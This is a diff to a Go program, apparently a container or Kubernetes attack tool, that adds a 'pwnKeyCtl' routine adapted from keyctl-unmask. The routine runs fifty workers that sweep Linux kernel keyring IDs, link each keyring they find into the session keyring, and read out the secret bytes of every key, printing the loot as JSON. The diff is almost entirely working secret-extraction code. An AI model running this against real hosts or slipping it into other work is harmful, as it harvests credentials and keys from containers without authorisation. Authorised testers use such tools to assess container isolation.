@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -11,6 +12,219 @@ import (
 	"strconv"
 	"strings"
 )
+
+type Key struct {
+	KeyId          int32
+	Valid          bool
+	Name           string
+	Type           string
+	Uid            string
+	Gid            string
+	Perms          string
+	String_Content string
+	Byte_Content   []byte
+	Comments       []string
+	Subkeys        []Key
+	size           int
+	Output         string
+}
+
+func worker(id int, jobs <-chan int, results chan<- Key) {
+	for j := range jobs {
+
+		if *verbosePtr == true {
+			fmt.Println("[DEBUG] Attempting to access key with ID: ", j)
+		}
+
+		k := Key{KeyId: int32(j)}
+
+		// syscall keyctl_describekeyid(keyid)
+		// Collects information about a key ID but not its contents
+		breturn, err := k.describeKeyId()
+		if err != nil {
+			if *verbosePtr == true {
+				fmt.Println("[ERROR]", err)
+			}
+		} else {
+			if *verbosePtr == true {
+				fmt.Println("[DEBUG] Got access to key with ID: ", j)
+			}
+			k.Valid = true
+			// Fill in the key details based on the syscall response
+			k.populate_describe(breturn)
+
+			if k.Type == "keyring" {
+				// Keyrings hold keys and are what we're looking for
+
+				// If you don't "possess" the keyring then you will likely
+				// be unable to read its contents. This links the keyring
+				// to your personal session keyring, and then tries to read
+				// the contents.
+				// syscall keyctl_link(src, -3=session keyring)
+				err := keyctl_Link(keyId(k.KeyId), keyId(keySpecSessionKeyring))
+
+				if err != nil {
+					if *verbosePtr == true {
+						fmt.Println("[ERROR]", err)
+					}
+				}
+				// list keys in keyring and fill in description deails
+				// TODO this is populating subkeys before the link which
+				// means the sub-sub keys can't do a read() op
+				k.populate_subkeys()
+
+				// Try to read all the secrets of the keys
+				for i := range k.Subkeys {
+					err := k.Subkeys[i].Get()
+					if err != nil {
+						//TODO what else can happen?
+						//Error.Print(err.Error())
+						if *verbosePtr == true {
+							fmt.Println("[ERROR]", err)
+						}
+					}
+				}
+				// Cleanup and unlink the keyring from your session
+				keyctl_Unlink(keyId(k.KeyId), keyId(keySpecSessionKeyring))
+			}
+
+			// Go back and collect the keyring data to be thorough
+			err := k.Get()
+			if err != nil {
+				// We would haven't already deduced this but there's a scenario
+				// where you have permission to describe() a key but not read() it
+				if msg := err.Error(); msg == "permission denied" {
+					k.Comments = append(k.Comments, "Read permission denied to user")
+				} else if err != nil {
+					fmt.Println(err.Error())
+				}
+			}
+		}
+
+		if k.Valid {
+			output, err := json.MarshalIndent(k, "", " ")
+			if err != nil {
+				fmt.Println("[ERROR] ", err)
+			}
+			k.Output = string(output)
+		}
+		results <- k
+	}
+}
+
+//The code in this function is originally from https://github.com/antitree/keyctl-unmask
+func pwnKeyCtl(min, max int) {
+	fmt.Println("[*] Attempting to Identify and Extract Keyring Values")
+	fmt.Println("[!] WARNING, this can be resource intensive and your pod/container process may be killed, iterate over min and max with 100000000 increments to be safe")
+
+	//We add one so that the min and max provided are inclusive to the actual jobs
+	numJobs := max - min + 1
+	jobs := make(chan int, numJobs)
+	results := make(chan Key)
+
+	for w := 1; w <= 50; w++ {
+		go worker(w, jobs, results)
+	}
+
+	for j := min; j <= max; j++ {
+		jobs <- j
+	}
+	close(jobs)
+
+	for a := 1; a <= numJobs; a++ {
+		key := <-results
+		if key.Valid {
+			fmt.Println("[!] Output", key.Output)
+		}
+	}
+}
+
+//This function is originally from https://github.com/antitree/keyctl-unmask
+func (k *Key) Get() error {
+	// Perform a syscall keyctlread() to get the secret bytes
+	// of a key. Returns error if it can't read the key.
+	var (
+		b        []byte
+		err      error
+		sizeRead int
+	)
+
+	if k.size == 0 {
+		k.size = 512
+	}
+
+	size := k.size
+
+	b = make([]byte, int(size))
+	sizeRead = size + 1
+	for sizeRead > size {
+		r1, err := keyctl_Read(keyId(k.KeyId), &b[0], size)
+		if err != nil {
+			return err
+		}
+
+		if sizeRead = int(r1); sizeRead > size {
+			b = make([]byte, sizeRead)
+			size = sizeRead
+			sizeRead = size + 1
+		} else {
+			k.size = sizeRead
+		}
+	}
+
+	// Update the original keypointer
+	content := b[:k.size]
+	k.Byte_Content = content
+	k.String_Content = string(content)
+
+	return err
+}
+
+//This function is originally from https://github.com/antitree/keyctl-unmask
+func (k *Key) populate_subkeys() (int, error) {
+	// Consume a keyid and run the syscall listkeys()
+	// Generates keyids for other keys part of the
+	// keychain.
+	nkid, err := listKeys(keyId(k.KeyId))
+	if err != nil {
+		return 0, err
+	}
+	var i int
+
+	for _, kid := range nkid {
+		// Turn each subkey ID into a key object
+		i++
+		nk := Key{KeyId: int32(kid)}
+		nkdesc, err := nk.describeKeyId()
+		// TODO IDK if you need to hunt for subkeys here because
+		// you're already going to find them from /proc/keys
+		// and you're going to get permission problems for subkeys
+		// I would assume? idk.
+		if err == nil {
+			fmt.Printf("[!] Subkey description for key [%d]: %s\n", kid, string(nkdesc))
+			err := nk.populate_describe(nkdesc)
+			if err != nil {
+				nk.Comments = append(nk.Comments, "Error parsing subkey describe text")
+			} else if nk.Type == "keyring" {
+				// If the subkey isn't a keyring cool because we'll find the keyrings later
+				nk.populate_subkeys() // TODO recursive, does this make sense?
+			} else {
+				// If the subkey is a user key, asymmetric key, or something else, try to read it
+				err := nk.Get()
+				if err != nil {
+					//TODO Not sure why there's a permission error during subkey search. Maybe because no link
+					nk.Comments = append(nk.Comments, fmt.Sprintf("Error during %s subkey read: %s", nk.Type, err.Error()))
+				}
+			}
+			k.Subkeys = append(k.Subkeys, nk)
+		} else {
+			nk.Comments = append(nk.Comments, "Error during subkey describe")
+		}
+	}
+	return i, nil
+}
+
+// End of Keyring Section
 
 func idenitfyVerifyK8Secrets() {
 	fmt.Println("[*] Identifying and Verifying K8's Secrets")
